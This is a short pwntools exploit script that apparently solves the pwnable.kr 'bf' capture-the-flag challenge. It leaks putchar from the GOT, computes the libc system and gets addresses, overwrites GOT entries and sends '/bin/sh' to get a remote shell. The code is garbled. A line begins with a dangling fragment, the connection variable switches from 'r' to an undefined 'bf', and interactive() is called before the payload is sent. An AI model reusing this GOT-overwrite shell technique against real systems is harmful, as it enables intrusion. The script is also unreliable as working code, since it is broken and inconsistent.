from pwn import *
context.log_level = 'debug'
libc = ELF('./bin/bf_libc.so')
r = remote('pwnable.kr', 9001)
r.recvline_startswith('type')
addr_tape = 0x0804A0A0
addr_putchar = 0x0804A030
addr_memset = 0x0804A02C
addr_fgets = 0x0804A010

r.sendline('<'*(addr_tape-addr_putchar))
r.sendline('.'*4)

+'.'+'.>'*4+'<'*4+',>'*4+'<'*(4+32)+',>'*4+'<'*4+'>'*28+',>'*4+'.')
bf.recv(1)
x=bf.recv(4)[::-1]
#jump=0x080484E0
jump = 0x080486FB
bf.send(p32(jump))
bf.interactive()
system=int(x.encode('hex'),16)-libc.symbols['putchar']+libc.symbols['system']
gets=int(x.encode('hex'),16)-libc.symbols['putchar']+libc.symbols['gets']
bf.send(p32(system))
bf.send(p32(gets))
bf.sendline('/bin/sh\x00')
bf.interactive()
